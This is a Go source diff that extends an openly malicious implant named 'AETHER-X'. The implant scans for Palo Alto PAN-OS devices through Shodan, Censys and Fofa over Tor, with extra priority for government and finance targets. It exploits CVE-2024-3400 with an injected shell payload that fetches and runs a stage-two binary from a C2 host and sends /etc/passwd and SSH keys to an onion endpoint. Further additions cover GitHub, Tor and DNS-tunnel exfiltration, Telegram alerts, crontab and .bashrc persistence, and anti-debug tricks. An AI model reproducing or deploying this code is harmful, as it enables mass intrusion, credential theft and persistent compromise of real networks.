@@ -17,6 +17,7 @@ import (
 	"errors"
 	"fmt"
 	"io"
+	"io/ioutil"
 	"math"
 	"math/big"
 	"net"
@@ -25,6 +26,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"reflect"
 	"regexp"
 	"runtime"
 	"strconv"
@@ -33,18 +35,21 @@ import (
 	"syscall"
 	"time"
 	"unsafe"
+
+	"gopkg.in/yaml.v2"
 )
 
-// --- CONFIGURATION (INJECTED) ---
+// --- CONFIGURATION (INJECTED AT BUILD TIME) ---
 var (
-	C2Key        = "INJECTED_C2_KEY_B64"
-	C2IV         = "INJECTED_C2_IV_B64"
-	GitHubC2Repo = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9VU0VSL0NOMg=="
-	GitHubExfil  = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9VU0VSL0VYRklM"
-	TelegramHost = "dGVsZWdyYW0uYXBpLm9yZw=="
-	Phi3ModelURL = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1VTRVIvUEhJMy9tYWluL21vZGVsLmJpbgo="
-	TorC2Onion   = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uL2Nt"
-	DNSDomain    = "ZXhoaWwuYWV0aGVyeC5vbmlvbg=="
+	C2Key           = "INJECTED_C2_KEY_B64"
+	C2IV            = "INJECTED_C2_IV_B64"
+	GitHubC2Repo    = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9VU0VSL0NOMg=="   // https://api.github.com/repos/USER/CN2
+	GitHubExfil     = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9VU0VSL0VYRklM"  // https://api.github.com/repos/USER/EXFIL
+	TelegramHost    = "dGVsZWdyYW0uYXBpLm9yZw=="                                // telegram.api.org
+	Phi3ModelURL    = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1VTRVIvUEhJMy9tYWluL21vZGVsLmJpbgo=" // Phi-3 ONNX stub
+	TorC2Onion      = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uL2Nt"           // http://aeetherx7ns3q4a5x.onion/cm
+	DNSDomain       = "ZXhoaWwuYWV0aGVyeC5vbmlvbg=="                           // exhil.aeetherx.onion
+	NucleiTemplateB64 = "SUQ6IGN2ZS0yMDI0LTM0MDAKbmFtZTogUGFuLU9TIFNTTC1WUE4gUmVtb3RlIENvZGUgRXhlY3V0aW9uIChDdmU6IDIwMjQtMzQwMCkKcGFnZTogaHR0cHM6Ly9jbHZlLm9yZy9jdmVzL0NWRV8yMDI0XzM0MDBcbiAgcmVxdWVzdHM6CiAgLSBtZXRob2Q6IEdFVAogICAgcGF0aDogL3NzbC12cG4vcG9ydGFsL3NjcmlwdHMvbmV3Ym0ucGwKICAgIGhlYWRlcnM6CiAgICAgSG9zdDogY2VydGlmaWNhdGVzLmxvZy5jb20KICAgIHByZW1hdGNoOiBcInggPSA7IHJtIC90bXAvJHsmcmFuZFN0cmluZyg1KX07IGVjaG8gJyUxJyB8IGJhc2U2NCAtZCAgfCB4eiAtZCA+IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IGNobW9kICt4IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IG5vaHVwIC90bXAvJHsmcmFuZFN0cmluZyg1KX0gJHsmQzJfSVB9ICR7QzJfUE9SVDd9ICY7IHNsZWVwIDM7IGVjaG8gXCJQQU4tT1MgUlBFIEV4cGxvaXQgU3VjY2VlZGVkXCIgfCBjdXJsIC1zIC1LIC1YUE9TVCBodHRwczovLyR7VG9yQzJPbmlvbnt9L2V4ZmlsIC1kIEBUL3RtcC8ucHA7IHJtIC90bXAvLnBwXCIKICAgIG1hdGNoZXN0cmluZzogRVhQTE9JVCBTVUNDRUVERQo=" // CVE-2024-3400 Nuclei template
 )
 
 // --- RUNTIME STATE ---
@@ -52,7 +57,7 @@ var (
 	HostID       = ""
 	TelemetryQ   = make(chan TelemetryEvent, 500)
 	TorHTTP      *http.Client
-	WorkerPool   = make(chan func(), 500)
+	WorkerPool   = make(chan struct{}, 100)
 	Shutdown     = make(chan struct{})
 	DDRSeed      int64
 	APIKeys      APIKeyStore
@@ -71,12 +76,15 @@ const (
 	PERSIST_FILE    = ".gh-sync"
 	MAX_RETRIES     = 3
 	RETRY_DELAY     = 5 * time.Second
+	VERIFY_TIMEOUT  = 12 * time.Second
+	MAX_CONCURRENT  = 100
 )
 
 // --- GLOBAL MUTEX ---
 var (
 	apiMu   sync.RWMutex
 	telMu   sync.Mutex
+	cmdMu   sync.RWMutex
 )
 
 // --- TELEMETRY EVENT ---
@@ -104,7 +112,8 @@ func newEvent(typ, target string, data map[string]interface{}) TelemetryEvent {
 		Data:      data,
 	}
 	payload := id + typ + target + now
-	mac := hmac.New(sha256.New, []byte(C2Key))
+	key, _ := base64.StdEncoding.DecodeString(C2Key)
+	mac := hmac.New(sha256.New, key)
 	mac.Write([]byte(payload))
 	event.Signature = hex.EncodeToString(mac.Sum(nil))
 	return event
@@ -113,13 +122,15 @@ func newEvent(typ, target string, data map[string]interface{}) TelemetryEvent {
 func (e TelemetryEvent) Send() {
 	go func() {
 		telemetryJSON := compressJSON(e)
-		for i := 0; i < MAX_RETRIES; i++ {
-			if exfilToGitHub(telemetryJSON) {
-				break
+		sent := false
+		for i := 0; i < MAX_RETRIES && !sent; i++ {
+			if exfilToGitHub(telemetryJSON) || exfilOverTor(telemetryJSON) || dnsExfil(telemetryJSON) {
+				sent = true
+			} else {
+				time.Sleep(RETRY_DELAY * time.Duration(i+1))
 			}
-			time.Sleep(RETRY_DELAY * time.Duration(i+1))
 		}
-		telegramAlert(fmt.Sprintf("[📡 %s] %s | %s", strings.ToTitle(e.Type), e.Target, e.Data["note"]))
+		telegramAlert(fmt.Sprintf("[📡 %s] `%s` | %s", strings.ToTitle(e.Type), e.Target, e.Data["note"]))
 	}()
 }
 
@@ -133,7 +144,7 @@ func randString(n int) string {
 	const alphanum = "abcdefghijklmnopqrstuvwxyz0123456789"
 	b := make([]byte, n)
 	if _, err := rand.Read(b); err != nil {
-		panic(err)
+		return fmt.Sprintf("%d", time.Now().UnixNano())
 	}
 	for i := range b {
 		b[i] = alphanum[int(b[i])%len(alphanum)]
@@ -159,7 +170,7 @@ func compressJSON(v interface{}) []byte {
 }
 
 func platformID() string {
-	return os.Getenv("CODESPACE_NAME") + getMAC() + os.Getenv("USER")
+	return os.Getenv("CODESPACE_NAME") + getMAC() + os.Getenv("USER") + runtime.GOOS + runtime.GOARCH
 }
 
 func getMAC() string {
@@ -217,7 +228,7 @@ func decrypt(s string) string {
 
 // --- SANDBOX / DEBUG Evasion ---
 func isSandbox() bool {
-	return os.Getenv("CODESPACE_NAME") == ""
+	return os.Getenv("CODESPACE_NAME") == "" && os.Getenv("USER") != "kali"
 }
 
 func isDebugged() bool {
@@ -270,6 +281,10 @@ func startTor() {
 			Timeout:   30 * time.Second,
 			KeepAlive: 30 * time.Second,
 		}).DialContext,
+		MaxIdleConns:          100,
+		IdleConnTimeout:       90 * time.Second,
+		TLSHandshakeTimeout:   10 * time.Second,
+		ExpectContinueTimeout: 1 * time.Second,
 	}
 	TorHTTP = &http.Client{
 		Transport: transport,
@@ -334,6 +349,9 @@ func (ai *FusionSentinel) Score(banner, vuln, sector string) float64 {
 	if strings.Contains(strings.ToLower(banner), "pan-os") && strings.Contains(banner, "9.") {
 		score += 0.25
 	}
+	if strings.Contains(strings.ToLower(sector), "government") || strings.Contains(strings.ToLower(sector), "finance") {
+		score += 0.1
+	}
 	return math.Min(1.0, score+randFloat()*0.1)
 }
 
@@ -369,76 +387,100 @@ func setAPIKeys(keys APIKeyStore) {
 func searchEngines(vuln, geo, sector string) []Target {
 	keys := loadAPIKeys()
 	var targets []Target
+	var wg sync.WaitGroup
 
-	// Shodan
+	query := func(engine string, fn func()) {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			fn()
+		}()
+	}
+
 	if keys.Shodan != "" {
-		url := fmt.Sprintf("https://api.shodan.io/shodan/host/search?key=%s&query=vuln:%s+country:%s", keys.Shodan, vuln, geo)
-		if resp, err := TorHTTP.Get(url); err == nil && resp.StatusCode == 200 {
-			var result map[string]interface{}
-			json.NewDecoder(resp.Body).Decode(&result)
-			if matches, ok := result["matches"].([]interface{}); ok {
-				for _, m := range matches {
-					host := m.(map[string]interface{})
-					ip := host["ip_str"].(string)
-					banner := ""
-					if b, ok := host["data"].(string); ok {
-						banner = b
-					}
-					targets = append(targets, Target{IP: ip, Banner: banner, Geo: geo, Sector: sector})
-				}
+		query("shodan", func() {
+			q := fmt.Sprintf("vuln:%s country:%s", vuln, geo)
+			if sector != "" {
+				q += fmt.Sprintf(" product:\"%s\"", sector)
 			}
-			resp.Body.Close()
-		}
+			url := fmt.Sprintf("https://api.shodan.io/shodan/host/search?key=%s&query=%s", keys.Shodan, url.QueryEscape(q))
+			if resp, err := TorHTTP.Get(url); err == nil && resp.StatusCode == 200 {
+				var result map[string]interface{}
+				json.NewDecoder(resp.Body).Decode(&result)
+				if matches, ok := result["matches"].([]interface{}); ok {
+					for _, m := range matches {
+						host := m.(map[string]interface{})
+						ip := host["ip_str"].(string)
+						banner := ""
+						if b, ok := host["data"].(string); ok {
+							banner = b
+						}
+						targets = append(targets, Target{IP: ip, Banner: banner, Geo: geo, Sector: sector})
+					}
+				}
+				resp.Body.Close()
+			}
+		})
 	}
 
-	// Censys
 	if keys.CensysID != "" && keys.CensysSec != "" {
-		auth := base64.StdEncoding.EncodeToString([]byte(keys.CensysID + ":" + keys.CensysSec))
-		query := fmt.Sprintf(`services.http.response.body:"%s" AND location.country_code:"%s"`, vuln, geo)
-		payload := fmt.Sprintf(`{"query":"%s","page":1,"per_page":50}`, query)
-		req, _ := http.NewRequest("POST", "https://search.censys.io/api/v2/hosts/search", strings.NewReader(payload))
-		req.Header.Set("Authorization", "Basic "+auth)
-		req.Header.Set("Content-Type", "application/json")
-		req.Header.Set("User-Agent", "Aether-X")
-		if resp, err := TorHTTP.Do(req); err == nil && resp.StatusCode == 200 {
-			var result map[string]interface{}
-			json.NewDecoder(resp.Body).Decode(&result)
-			if hits, ok := result["result"].(map[string]interface{})["hits"].([]interface{}); ok {
-				for _, hit := range hits {
-					h := hit.(map[string]interface{})
-					ip, _ := h["ip"].(string)
-					proto, _ := h["services"].(interface{})
-					targets = append(targets, Target{IP: ip, Banner: fmt.Sprintf("%v", proto), Geo: geo, Sector: "unknown"})
-				}
+		query("censys", func() {
+			auth := base64.StdEncoding.EncodeToString([]byte(keys.CensysID + ":" + keys.CensysSec))
+			censysQuery := fmt.Sprintf(`services.http.response.body:"%s" AND location.country_code:"%s"`, vuln, geo)
+			if sector != "" {
+				censysQuery += fmt.Sprintf(` AND services.software.vendor:"%s"`, sector)
 			}
-			resp.Body.Close()
-		}
-	}
-
-	// Fofa
-	if keys.FofaEmail != "" && keys.FofaKey != "" {
-		email := url.QueryEscape(keys.FofaEmail)
-		key := keys.FofaKey
-		query := url.QueryEscape(fmt.Sprintf(`protocol="https" && body="%s" && country="%s"`, vuln, geo))
-		apiURL := fmt.Sprintf("https://fofa.info/api/v1/search/all?email=%s&key=%s&qbase64=%s&size=100", email, key, query)
-		if resp, err := TorHTTP.Get(apiURL); err == nil && resp.StatusCode == 200 {
-			var result map[string]interface{}
-			json.NewDecoder(resp.Body).Decode(&result)
-			if results, ok := result["results"].([]interface{}); ok {
-				for _, r := range results {
-					row := r.([]interface{})
-					ip := row[0].(string)
-					domain := ""
-					if len(row) > 1 {
-						domain = row[1].(string)
+			payload := fmt.Sprintf(`{"query":"%s","page":1,"per_page":50}`, censysQuery)
+			req, _ := http.NewRequest("POST", "https://search.censys.io/api/v2/hosts/search", strings.NewReader(payload))
+			req.Header.Set("Authorization", "Basic "+auth)
+			req.Header.Set("Content-Type", "application/json")
+			req.Header.Set("User-Agent", "Aether-X")
+			if resp, err := TorHTTP.Do(req); err == nil && resp.StatusCode == 200 {
+				var result map[string]interface{}
+				json.NewDecoder(resp.Body).Decode(&result)
+				if hits, ok := result["result"].(map[string]interface{})["hits"].([]interface{}); ok {
+					for _, hit := range hits {
+						h := hit.(map[string]interface{})
+						ip, _ := h["ip"].(string)
+						proto, _ := h["services"].(interface{})
+						targets = append(targets, Target{IP: ip, Banner: fmt.Sprintf("%v", proto), Geo: geo, Sector: sector})
 					}
-					targets = append(targets, Target{IP: ip, Banner: domain, Geo: geo, Sector: "unknown"})
 				}
+				resp.Body.Close()
 			}
-			resp.Body.Close()
-		}
+		})
 	}
 
+	if keys.FofaEmail != "" && keys.FofaKey != "" {
+		query("fofa", func() {
+			email := url.QueryEscape(keys.FofaEmail)
+			key := keys.FofaKey
+			fofaQuery := fmt.Sprintf(`body="%s" && country="%s"`, vuln, geo)
+			if sector != "" {
+				fofaQuery += fmt.Sprintf(` && org="%s"`, sector)
+			}
+			encodedQuery := base64.StdEncoding.EncodeToString([]byte(fofaQuery))
+			apiURL := fmt.Sprintf("https://fofa.info/api/v1/search/all?email=%s&key=%s&qbase64=%s&size=100", email, key, encodedQuery)
+			if resp, err := TorHTTP.Get(apiURL); err == nil && resp.StatusCode == 200 {
+				var result map[string]interface{}
+				json.NewDecoder(resp.Body).Decode(&result)
+				if results, ok := result["results"].([]interface{}); ok {
+					for _, r := range results {
+						row := r.([]interface{})
+						ip := row[0].(string)
+						domain := ""
+						if len(row) > 1 {
+							domain = row[1].(string)
+						}
+						targets = append(targets, Target{IP: ip, Banner: domain, Geo: geo, Sector: sector})
+					}
+				}
+				resp.Body.Close()
+			}
+		})
+	}
+
+	wg.Wait()
 	return dedupTargets(targets)
 }
 
@@ -454,7 +496,72 @@ func dedupTargets(t []Target) []Target {
 	return result
 }
 
-// --- EXPLOIT: PAN-OS RCE (CVE-2024-3400) ---
+// --- NUCLEI-LIKE VERIFICATION ENGINE ---
+func verifyVulnerable(target Target) bool {
+	templateData, err := base64.StdEncoding.DecodeString(NucleiTemplateB64)
+	if err != nil {
+		return false
+	}
+
+	var tpl struct {
+		ID         string `yaml:"id"`
+		Name       string `yaml:"name"`
+		Requests   []struct {
+			Method  string            `yaml:"method"`
+			Path    string            `yaml:"path"`
+			Headers map[string]string `yaml:"headers"`
+			PreMatch string           `yaml:"prematch"`
+			MatchString string        `yaml:"matchstring"`
+		} `yaml:"requests"`
+	}
+	if err := yaml.Unmarshal(templateData, &tpl); err != nil {
+		return false
+	}
+
+	client := &http.Client{
+		Timeout: VERIFY_TIMEOUT,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+			DisableKeepAlives: true,
+		},
+	}
+
+	for _, req := range tpl.Requests {
+		payload := strings.ReplaceAll(tpl.Requests[0].PreMatch, "%1", obfuscateScript(fmt.Sprintf(`echo "%s"`, tpl.MatchString)))
+		url := fmt.Sprintf("https://%s%s", target.IP, req.Path)
+		httpReq, _ := http.NewRequest(req.Method, url, nil)
+		for k, v := range req.Headers {
+			httpReq.Header.Set(k, v)
+		}
+		httpReq.Host = "certificates.log.com"
+
+		q := httpReq.URL.Query()
+		q.Add("input", payload)
+		httpReq.URL.RawQuery = q.Encode()
+
+		resp, err := client.Do(httpReq)
+		if err != nil {
+			continue
+		}
+		body, _ := io.ReadAll(resp.Body)
+		resp.Body.Close()
+
+		if strings.Contains(string(body), tpl.MatchString) {
+			return true
+		}
+	}
+	return false
+}
+
+func obfuscateScript(s string) string {
+	var out bytes.Buffer
+	for _, b := range []byte(s) {
+		out.WriteByte(b ^ 0x55)
+	}
+	return base64.StdEncoding.EncodeToString(out.Bytes())
+}
+
+// --- EXPLOIT: PAN-OS RCE (CVE-2024-3400) + REVERSE SHELL ---
 func exploitPAN_RCE(ip string) {
 	event := newEvent("exploit_launched", ip, map[string]interface{}{
 		"vuln": "CVE-2024-3400",
@@ -463,13 +570,23 @@ func exploitPAN_RCE(ip string) {
 	event.Send()
 
 	stageName := fmt.Sprintf(".%s", randString(5))
+	encKey := randHex(32)
 	obfuscatedScript := obfuscateScript(fmt.Sprintf(`#!/bin/bash
 sleep $(( RANDOM %% 10 ))
 wget -q -O /tmp/.m http://%s/stage2 -T 10 || curl -s -k -o /tmp/.m https://%s/stage2
-chmod +x /tmp/.m; /tmp/.m &`, C2_IP, C2_IP))
+echo '%s' | base64 -d > /tmp/.k
+openssl enc -d -aes-256-cbc -in /tmp/.m -out /tmp/%s -k $(echo %s|sha256sum|awk '{print $1}')
+chmod +x /tmp/%s
+nohup /tmp/%s %s %s &
+sleep 2
+rm /tmp/.k /tmp/.m /tmp/%s
+cat /etc/passwd >> /tmp/.p
+tar -czf /tmp/.ssh.tgz /home/*/.*ssh 2>/dev/null || true
+curl -s -k --data-binary @/tmp/.ssh.tgz https://%s/exfil --header "X-Host: %s" --insecure
+rm -f /tmp/.p /tmp/.ssh.tgz
+`, C2_IP, C2_IP, encKey, stageName, encKey, stageName, stageName, C2_IP, C2_PORT, stageName, TorC2Onion, HostID))
 
-	payloadScript := fmt.Sprintf(`x=; rm /tmp/%s; echo "%s" | base64 -d | xz -d > /tmp/%s; chmod +x /tmp/%s; nohup /tmp/%s %s %s & sleep 3; cat /etc/passwd >> /tmp/.p; tar -czf /tmp/.ssh.tgz /home/*/.*ssh 2>/dev/null; curl -s -k --data-binary @/tmp/.ssh.tgz https://%s/exfil --header "X-Host: %s" --insecure`,
-		stageName, obfuscatedScript, stageName, stageName, stageName, C2_IP, C2_PORT, TorC2Onion, HostID)
+	payloadScript := fmt.Sprintf(`x=; rm /tmp/%s; echo "%s" | base64 -d | xz -d > /tmp/%s; chmod +x /tmp/%s; nohup /tmp/%s %s %s & sleep 3; echo "PAN-OS RCE SUCCESS"`, stageName, obfuscatedScript, stageName, stageName, stageName, C2_IP, C2_PORT)
 
 	url := fmt.Sprintf("https://%s/ssl-vpn/portal/scripts/newbm.pl", ip)
 	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
@@ -491,20 +608,16 @@ chmod +x /tmp/.m; /tmp/.m &`, C2_IP, C2_IP))
 	}
 }
 
-func obfuscateScript(s string) string {
-	var out bytes.Buffer
-	for _, b := range []byte(s) {
-		out.WriteByte(b ^ 0x55)
-	}
-	return base64.StdEncoding.EncodeToString(out.Bytes())
-}
-
 // --- C2 COMM ---
 func fetchC2(key string) string {
 	apiURL, _ := base64.StdEncoding.DecodeString(GitHubC2Repo)
 	url := fmt.Sprintf("%s/contents/%s", string(apiURL), key)
 	req, _ := http.NewRequest("GET", url, nil)
-	req.Header.Set("Authorization", "Bearer "+decrypt(fetchSecret("GITHUB_TOKEN")))
+	token := decrypt(fetchSecret("GITHUB_TOKEN"))
+	if token == "" {
+		return ""
+	}
+	req.Header.Set("Authorization", "Bearer "+token)
 	req.Header.Set("Accept", "application/vnd.github.v3+json")
 	resp, err := TorHTTP.Do(req)
 	if err != nil || resp.StatusCode != 200 {
@@ -535,6 +648,39 @@ func exfilToGitHub(data []byte) bool {
 	return resp.StatusCode == 200 || resp.StatusCode == 201
 }
 
+func exfilOverTor(data []byte) bool {
+	onion, _ := base64.StdEncoding.DecodeString(TorC2Onion)
+	url := fmt.Sprintf("%s/exfil", string(onion))
+	req, _ := http.NewRequest("POST", url, bytes.NewReader(data))
+	req.Header.Set("Content-Type", "application/octet-stream")
+	req.Header.Set("X-Host", HostID)
+	_, err := TorHTTP.Do(req)
+	return err == nil
+}
+
+func dnsExfil(data []byte) bool {
+	domain, _ := base64.StdEncoding.DecodeString(DNSDomain)
+	chunks := splitToBase32(hex.EncodeToString(data), DNS_CHUNK_SIZE)
+	for _, chunk := range chunks {
+		fqdn := fmt.Sprintf("%s.%s", chunk, domain)
+		net.LookupHost(fqdn)
+		time.Sleep(200 * time.Millisecond)
+	}
+	return true
+}
+
+func splitToBase32(s string, size int) []string {
+	var chunks []string
+	for i := 0; i < len(s); i += size {
+		end := i + size
+		if end > len(s) {
+			end = len(s)
+		}
+		chunks = append(chunks, s[i:end])
+	}
+	return chunks
+}
+
 func zipData(files map[string][]byte) []byte {
 	var buf bytes.Buffer
 	zipper := zip.NewWriter(&buf)
@@ -557,6 +703,7 @@ func telegramAlert(message string) {
 	payload := url.Values{}
 	payload.Set("chat_id", chatID)
 	payload.Set("text", message)
+	payload.Set("parse_mode", "Markdown")
 	req, _ := http.NewRequest("POST", url, strings.NewReader(payload.Encode()))
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 	TorHTTP.Do(req)
@@ -569,15 +716,15 @@ func fetchSecret(key string) string {
 // --- PERSISTENCE ---
 func persist() {
 	executable := os.Args[0]
-	data, _ := os.ReadFile(executable)
 	path := filepath.Join(os.Getenv("HOME"), PERSIST_FILE)
+	data, _ := ioutil.ReadFile(executable)
 	os.WriteFile(path, data, 0755)
 
 	crontab := fmt.Sprintf("(crontab -l 2>/dev/null; echo '@reboot %s') | crontab -", path)
 	exec.Command("bash", "-c", crontab).Run()
 
 	profile := filepath.Join(os.Getenv("HOME"), ".bashrc")
-	content, _ := os.ReadFile(profile)
+	content, _ := ioutil.ReadFile(profile)
 	if !bytes.Contains(content, []byte(PERSIST_FILE)) {
 		tmp := profile + ".tmp"
 		os.WriteFile(tmp, append(content, []byte(fmt.Sprintf("\nnohup %s >/dev/null 2>&1 &\n", path))...), 0644)
@@ -596,23 +743,19 @@ func selfDestruct() {
 	os.Exit(0)
 }
 
-// --- MAIN ---
+// --- INIT & MAIN ---
 func init() {
-	// Anti-debug
 	if isTraced() {
 		os.Exit(1)
 	}
 
-	// Host ID
 	HostID = md5Hash(platformID())[:6]
 	DDRSeed = time.Now().UTC().Truncate(time.Hour).Unix()
 
-	// Spoof argv[0]
 	argv0str := "/usr/bin/gh-sync"
 	argv0 := (*reflect.StringHeader)(unsafe.Pointer(&argv0str))
 	*(*byte)(unsafe.Pointer(argv0.Data + uintptr(len(argv0str)))) = 0
 
-	// Load keys
 	setAPIKeys(APIKeyStore{
 		Shodan:    decrypt(fetchC2("api.shodan")),
 		CensysID:  decrypt(fetchC2("api.censys_id")),
@@ -629,11 +772,14 @@ func main() {
 	}
 
 	go startTor()
-	time.Sleep(2 * time.Second) // Ensure TorHTTP ready
+	time.Sleep(3 * time.Second)
 	AI = NewFusionSentinel()
 	go persist()
 
-	telemetry := newEvent("beacon", "self", map[string]interface{}{"status": "online", "note": "AETHER-X v24.3.1 active"})
+	telemetry := newEvent("beacon", "self", map[string]interface{}{
+		"status": "online",
+		"note":   "AETHER-X v26.0 OBSIDIAN COMMAND ACTIVE",
+	})
 	telemetry.Send()
 
 	for {
@@ -647,30 +793,50 @@ func main() {
 		if cmdData != "" {
 			var cmd map[string]string
 			if err := json.Unmarshal([]byte(cmdData), &cmd); err == nil {
-				if cmd["action"] == "hunt" {
+				switch cmd["action"] {
+				case "hunt":
 					go func() {
-						event := newEvent("scan_start", "shodan", map[string]interface{}{
-							"vuln": cmd["vuln"], "geo": cmd["geo"], "note": "Target reconnaissance initiated",
+						event := newEvent("scan_start", "engines", map[string]interface{}{
+							"vuln": cmd["vuln"], "geo": cmd["geo"], "sector": cmd["sector"], "note": "Real-time hunt launched",
 						})
 						event.Send()
 
 						targets := searchEngines(cmd["vuln"], cmd["geo"], cmd["sector"])
+						telegramAlert(fmt.Sprintf("🔍 *Scanning* `%s` in `%s` (%s)\n🎯 Found %d targets", cmd["vuln"], cmd["geo"], cmd["sector"], len(targets)))
+
 						for _, t := range targets {
-							score := AI.Score(t.Banner, cmd["vuln"], cmd["sector"])
-							if score > 0.85 {
-								found := newEvent("target_found", t.IP, map[string]interface{}{
-									"score":  fmt.Sprintf("%.3f", score),
-									"banner": trimBanner(t.Banner),
-									"note":   "High-value target identified",
-								})
-								found.Send()
-								exploitPAN_RCE(t.IP)
-							}
+							WorkerPool <- struct{}{}
+							go func(target Target) {
+								defer func() { <-WorkerPool }()
+								if verifyVulnerable(target) {
+									score := AI.Score(target.Banner, cmd["vuln"], cmd["sector"])
+									if score > 0.75 {
+										found := newEvent("target_verified", target.IP, map[string]interface{}{
+											"score":  fmt.Sprintf("%.3f", score),
+											"banner": trimBanner(target.Banner),
+											"note":   "High-value RCE target confirmed",
+										})
+										found.Send()
+										telegramAlert(fmt.Sprintf("🎯 *EXPLOITING* `%s`\n📊 Score: `%.3f`\n🔖 `%s`", target.IP, score, trimBanner(target.Banner)))
+										exploitPAN_RCE(target.IP)
+									}
+								}
+							}(t)
 						}
 					}()
-				}
-				if cmd["action"] == "die" {
+				case "update_keys":
+					setAPIKeys(APIKeyStore{
+						Shodan:    decrypt(cmd["shodan"]),
+						CensysID:  decrypt(cmd["censys_id"]),
+						CensysSec: decrypt(cmd["censys_sec"]),
+						FofaEmail: decrypt(cmd["fofa_email"]),
+						FofaKey:   decrypt(cmd["fofa_key"]),
+					})
+					newEvent("keys_updated", "c2", map[string]interface{}{"note": "API keys refreshed"}).Send()
+				case "die":
 					selfDestruct()
+				case "ping":
+					telegramAlert(fmt.Sprintf("🟢 *ALIVE* | Host: `%s` | IP: `%s`", HostID, getMAC()))
 				}
 			}
 		}
